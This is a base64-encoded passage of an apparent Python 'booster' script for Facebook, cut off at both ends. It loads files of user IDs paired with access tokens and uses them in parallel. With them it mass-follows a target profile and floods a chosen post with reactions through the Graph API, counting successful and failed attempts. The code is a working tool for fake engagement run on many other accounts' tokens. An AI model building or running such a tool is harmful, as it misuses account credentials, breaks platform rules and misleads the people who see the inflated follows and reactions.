ZWQgPj0gYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICAgICAgcHJpbnQoIk5vIG1vcmUgdG9rZW5zIGF2YWlsYWJsZS4iKQogICAgICAgICAgICBicmVhawoKICAgIHByaW50KGYie2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIntncmVlbn1UT1RBTCBTVUNDRVNTRlVMIFJFQUNUSU9OUzoge3RvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zfSIpCgoKIyBFeGFtcGxlIGNhbGwKIyBwZXJmb3JtX3JlYWN0aW9uX2Zhc3QoKQoKCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IKaW1wb3J0IHJlCmltcG9ydCByZXF1ZXN0cwoKZGVmIGV4dHJhY3RfdXNlcl9pZF9wcm9mKHVybCk6CiAgICAiIiJFeHRyYWN0IHVzZXIgSUQgZnJvbSBhIEZhY2Vib29rIHByb2ZpbGUgVVJMLiIiIgogICAgcGF0dGVybiA9IHInaWQ9KFxkKyl8cHJvZmlsZVwucGhwXD9pZD0oXGQrKScKICAgIG1hdGNoID0gcmUuc2VhcmNoKHBhdHRlcm4sIHVybCkKICAgIGlmIG1hdGNoOgogICAgICAgIHJldHVybiBtYXRjaC5ncm91cCgxKSBvciBtYXRjaC5ncm91cCgyKSAgIyBSZXR1cm4gdGhlIGNhcHR1cmVkIGdyb3VwCiAgICByZXR1cm4gTm9uZSAgIyBSZXR1cm4gTm9uZSBpZiBubyBtYXRjaCBpcyBmb3VuZAoKZGVmIGZvbGxvd19hY2NvdW50KHBhZ2VfYWNjZXNzX3Rva2VuLCBhY2NvdW50X2lkKToKICAgICIiIkZvbGxvdyBhbiBhY2NvdW50IHVzaW5nIGEgc3BlY2lmaWMgcGFnZSBhY2Nlc3MgdG9rZW4uIiIiCiAgICBoZWFkZXJzXyA9IHsKICAgICAgICAnVXNlci1BZ2VudCc6IFdfdWVyYWdudCgpICAjIEFzc3VtaW5nIFdfdWVyYWdudCgpIGZ1bmN0aW9uIHByb3ZpZGVzIHVzZXIgYWdlbnRzCiAgICB9CiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZidCZWFyZXIge3BhZ2VfYWNjZXNzX3Rva2VufScsCiAgICAgICAgKipoZWFkZXJzXyAgIyBNZXJnaW5nIGJvdGggaGVhZGVycwogICAgfQogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgKICAgICAgICAgICAgZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTguMC97YWNjb3VudF9pZH0vc3Vic2NyaWJlcnMnLAogICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMKICAgICAgICApCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMAogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiUmVxdWVzdCBmYWlsZWQgZm9yIHRva2VuIHtwYWdlX2FjY2Vzc190b2tlbn06IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgYXV0b19mb2xsb3dfZmFzdCgpOgogICAgIiIiQXV0b21hdGljYWxseSBmb2xsb3cgYSB0YXJnZXQgYWNjb3VudCB1c2luZyB0b2tlbnMgYW5kIHBhZ2VzLiIiIgogICAgZmlsZV9vcHRpb25zID0gewogICAgICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgICAgIDI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKICAgIH0KICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICB7d2hpdGV9Q0hPT1NFIFRZUEUgT0YgUkVBQ1RPUlM6IAogICAgIHtibHVlfVsxXSB7Z3JlZW59RlJBIEFDQ09VTlQgCiAgICAge2JsdWV9WzJdIHtncmVlbn1GUkEgUEFHRVMKICAgICB7Ymx1ZX1bM10ge2dyZWVufVJQVyBBQ0NPVU5UCiAgICAge2JsdWV9WzRdIHtncmVlbn1SUFcgUEFHRVMKICAgICB7cmVkfVswXSAge3JlZH0gRVhJVCAKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpICAjIERpc3BsYXkgb25seSB0aGUgZmlsZW5hbWUKCiAgICAjIERpc3BsYXkgZmlsZSBvcHRpb25zIGZvciB1c2VyIHRvIHNlbGVjdAogICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUNob29zZSB0aGUgdHlwZSBvZiBmb2xsb3dlcnMgOiAiKSkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgZmlsZV9wYXRoID0gZmlsZV9vcHRpb25zLmdldChmaWxlX2Nob2ljZSkKICAgIGlmIG5vdCBmaWxlX3BhdGg6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgdG9rZW5zID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpIGlmIGxpbmUuc3RyaXAoKV0KICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KCiAgICBpZiBsZW4odG9rZW5zKSA9PSAwOgogICAgICAgIHByaW50KCJObyB0b2tlbnMgZm91bmQgaW4gdGhlIHNlbGVjdGVkIGZpbGUuIikKICAgICAgICByZXR1cm4KICAgIAogICAgc3RhcnRfbGluZSA9IGludChpbnB1dChmIiAgICB7eWVsbG93fUVudGVyIHRoZSBzdGFydGluZyBsaW5lICgxIHRvIHtsZW4odG9rZW5zKX0pOiAiKSkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0KICAgIAogICAgYWNjb3VudF9pZCA9IGV4dHJhY3RfdXNlcl9pZF9wcm9mKGlucHV0KGYiICAge3llbGxvd31FbnRlciB0aGUgdGFyZ2V0IGFjY291bnQgVVJMOiAiKSkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgaWYgbm90IGFjY291bnRfaWQ6CiAgICAgICAgcHJpbnQoZiJJbnZhbGlkIGFjY291bnQgSUQuIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgCiAgICAgICAgZm9sbG93X2xpbWl0ID0gaW50KGlucHV0KGYnICAgIHtyZWR9TElNSVQ6ICcpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIkludmFsaWQgbnVtYmVyIGZvciBmb2xsb3cgbGltaXQuIikKICAgICAgICByZXR1cm4KCiAgICBmb2xsb3dfY291bnQgPSAwCiAgICBmYWlsZWRfY291bnQgPSAwICAjIFRyYWNrIGZhaWxlZCBmb2xsb3dzCiAgICBjdXJyZW50X2luZGV4ID0gMCAgIyBTdGFydCBmcm9tIHRoZSBiZWdpbm5pbmcgb2YgdGhlIHRva2VucyBsaXN0CgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MTApIGFzIGV4ZWN1dG9yOgogICAgICAgIHdoaWxlIGZvbGxvd19jb3VudCA8IGZvbGxvd19saW1pdCBhbmQgY3VycmVudF9pbmRleCA8IGxlbih0b2tlbnMpOgogICAgICAgICAgICB0b2tlbiA9IHRva2Vuc1tjdXJyZW50X2luZGV4XQogICAgICAgICAgICBwYWdlX2FjY2Vzc190b2tlbiA9IHRva2VuLnNwbGl0KCd8JylbMV0KICAgICAgICAgICAgdWlkID0gdG9rZW4uc3BsaXQoJ3wnKVswXQoKICAgICAgICAgICAgZnV0dXJlID0gZXhlY3V0b3Iuc3VibWl0KGZvbGxvd19hY2NvdW50LCBwYWdlX2FjY2Vzc190b2tlbiwgYWNjb3VudF9pZCkKICAgICAgICAgICAgc3VjY2VzcyA9IGZ1dHVyZS5yZXN1bHQoKQoKICAgICAgICAgICAgaWYgc3VjY2VzczoKICAgICAgICAgICAgICAgIGZvbGxvd19jb3VudCArPSAxCiAgICAgICAgICAgICAgICBwcmludCgiICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICBwcmludChmIiAgICAge2dyZWVufVtSRUFDVE9SXSB7eWVsbG93fXt1aWR9ICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIA+IHtncmVlbn1TVUNDRVNTRlVMTFkgRk9MTE9XRUQhIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGZhaWxlZF9jb3VudCArPSAxCiAgICAgICAgICAgICAgICBwcmludCgiICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICBwcmludChmIiAgIHtyZWR9W1JFQUNUT1JdIHt5ZWxsb3d9e3VpZH0gIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgD4ge3JlZH1GQUlMRUQgVE8gRk9MTE9XISIpCiAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgIGN1cnJlbnRfaW5kZXggKz0gMSAgIyBNb3ZlIHRvIHRoZSBuZXh0IHRva2VuIGFmdGVyIGVhY2ggYXR0ZW1wdAoKICAgICAgICAgICAgaWYgY3VycmVudF9pbmRleCA+PSBsZW4odG9rZW5zKSBhbmQgZm9sbG93X2NvdW50IDwgZm9sbG93X2xpbWl0OgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgY3VycmVudF9pbmRleCA9IDAgICMgUmVzZXQgaW5kZXggdG8gcmV1c2UgdG9rZW5zIGlmIG5lZWRlZAoKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZicgICAgIHtncmVlbn1TVUNDRVNTOiB7Zm9sbG93X2NvdW50fScpCiAgICBwcmludChmJyAgICAge3JlZH1GQUlMRUQ6IHtmYWlsZWRfY291bnR9JykKCiMgUnVuIHRoZSBmdW5jdGlvbgoKCgoKCgoKCgppbXBvcnQgcmUKCmRlZiBleHRyYWN0X2ZiaWRfZHAodXJsKToKICAgICIiIkV4dHJhY3QgRmFjZWJvb2sgSUQgZnJvbSBhIEZhY2Vib29rIHBob3RvIFVSTC4iIiIKICAgIHBhdHRlcm4gPSByJ2ZiaWQ9KFxkKyknCiAgICBtYXRjaCA9IHJlLnNlYXJjaChwYXR0ZXJuLCB1cmwpCiAgICAKICAgIGlmIG1hdGNoOgogICAgICAgIHJldHVybiBtYXRjaC5ncm91cCgxKSAgIyBSZXR1cm4gdGhlIGNhcHR1cmVkIGdyb3VwCiAgICByZXR1cm4gTm9uZSAgIyBSZXR1cm4gTm9uZSBpZiBubyBtYXRjaCBpcyBmb3VuZAoKCmltcG9ydCByZXF1ZXN0cwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yLCBhc19jb21wbGV0ZWQKCmRlZiBwZXJmb3JtX3JlYWN0aW9uKHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKToKICAgICIiIlNlbmQgYSByZWFjdGlvbiB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3BsaXQoJ3wnKVsxXSAgIyBBc3N1bWluZyBmb3JtYXQgaXMgZW1haWx8YWNjZXNzX3Rva2VuCiAgICBhdXRvX3JlYWN0ID0gZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dWlkX3VybH0vcmVhY3Rpb25zP3R5cGU9e3JlYWN0aW9uX3R5cGV9JmFjY2Vzc190b2tlbj17YWNjZXNzX3Rva2VufScKICAgIAogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChhdXRvX3JlYWN0KQogICAgICAgIHJldHVybiBhY2Nlc3NfdG9rZW4sIHJlc3BvbnNlLnN0YXR1c19jb2RlLCByZXNwb25zZS50ZXh0ICAjIFJldHVybiB0aGUgcmVzdWx0cyBmb3IgZnVydGhlciBwcm9jZXNzaW5nCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIGFjY2Vzc190b2tlbiwgTm9uZSwgc3RyKGUpICAjIEhhbmRsZSByZXF1ZXN0IGV4Y2VwdGlvbnMKCmRlZiBwZXJmb3JtX3JlYWN0aW9uX2Zhc3RfZHAoKToKICAgICIiIlBlcmZvcm0gcmVhY3Rpb25zIGJhc2VkIG9uIHVzZXIgaW5wdXQgZm9yIGZpbGUgY2hvaWNlLCBzdGFydGluZyBsaW5lLCBwb3N0IGxpbmssIHJlYWN0aW9uIHR5cGUsIGFuZCBudW1iZXIgb2YgcmVhY3Rpb25zLiIiIgogICAgICAgCiAgICAjIFN0ZXAgMTogQXNrIHRoZSB1c2VyIHdoaWNoIGZpbGUgdG8gdXNlCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge2JsdWV9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHtibHVlfVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdICB7cmVkfSBFWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikgICMgRGlzcGxheSBvbmx5IHRoZSBmaWxlbmFtZQogICAgCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUNob29zZTogICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDI6IExvYWQgdGhlIHRva2VucyBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCkgaWYgbGluZS5zdHJpcCgpXSAgIyBFbnN1cmUgbm8gZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvYWRpbmcgdG9rZW5zOiB7ZX0iKQogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfXtyZWR9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgc3RhcnRfbGluZSA8IDEgb3Igc3RhcnRfbGluZSA+IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KGYiUGxlYXNlIGVudGVyIGEgdmFsaWQgbGluZSBudW1iZXIgYmV0d2VlbiAxIGFuZCB7YXZhaWxhYmxlX3Rva2Vuc30uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0gIAogICAgcHJpbnQoZiIgICAge2dyZWVufUZPUk1BVCB7eWVsbG93fToge3JlZH1odHRwczovL3d3dy5mYWNlYm9vay5jb20vcGhvdG8ucGhwP2ZiaWQ9NTQxMzYxNjkxODA4NjAwIikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgeiA9IGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBwb3N0IGxpbmsgb3IgSUQ6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoeikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgdWlkX3VybCA9IHBvc3RfaWQgIAoKICAgIHByaW50KGYiIiIgICAge3llbGxvd31DaG9vc2UgdGhlIHJlYWN0aW9uIHR5cGU6CiAgICAge2JsdWV9WzFdIHtncmVlbn1MSUtFCiAgICAge2JsdWV9WzJdIHtncmVlbn1MT1ZFCiAgICAge2JsdWV9WzNdIHtncmVlbn1XT1cKICAgICB7Ymx1ZX1bNF0ge2dyZWVufVNBRAogICAgIHtibHVlfVs1XSB7Z3JlZW59QU5HUlkKICAgICB7Ymx1ZX1bNl0ge2dyZWVufUhBSEEKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAKICAgIHRyeToKICAgICAgICByZWFjdGlvbl9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtncmVlbn1DaG9vc2U6ICIpKQogICAgICAgIHJlYWN0aW9uX21hcCA9IHsKICAgICAgICAgICAgMTogIkxJS0UiLAogICAgICAgICAgICAyOiAiTE9WRSIsCiAgICAgICAgICAgIDM6ICJXT1ciLAogICAgICAgICAgICA0OiAiU0FEIiwKICAgICAgICAgICAgNTogIkFOR1JZIiwKICAgICAgICAgICAgNjogIkhBSEEiCiAgICAgICAgfQogICAgICAgIHJlYWN0aW9uX3R5cGUgPSByZWFjdGlvbl9tYXAuZ2V0KHJlYWN0aW9uX2Nob2ljZSwgTm9uZSkKICAgICAgICBpZiByZWFjdGlvbl90eXBlIGlzIE5vbmU6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIHJlYWN0aW9uIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIAogICAgdHJ5OgogICAgICAgIG51bV9yZWFjdGlvbnMgPSBpbnQoaW5wdXQoZiIgICAgIHt5ZWxsb3d9RW50ZXIgdGhlIG51bWJlciBvZiByZWFjdGlvbnM6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4